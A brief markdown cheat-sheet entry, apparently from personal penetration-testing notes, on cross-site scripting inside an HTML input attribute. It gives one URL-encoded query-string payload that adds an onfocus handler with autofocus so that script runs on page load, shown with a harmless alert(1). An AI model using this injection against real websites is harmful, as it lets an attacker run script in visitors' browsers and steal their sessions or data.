# XSS

## Legend

Symbol/Abbr. | Description
-------------|------------
✔ | Finished
❌ | Rejected / Not done
! | Important
X -> Y | X has resulted in Y
X &-> Y |X depends on Y

## XSS in `<input ../>` attribute

Use `onfocus` event with the `autofocus` HTML5 attribute:

    [path]?q=aaaaa%20onfocus%3Dalert%281%29%20autofocus%20     # aaaaa onfocus=alert(1) autofocus 
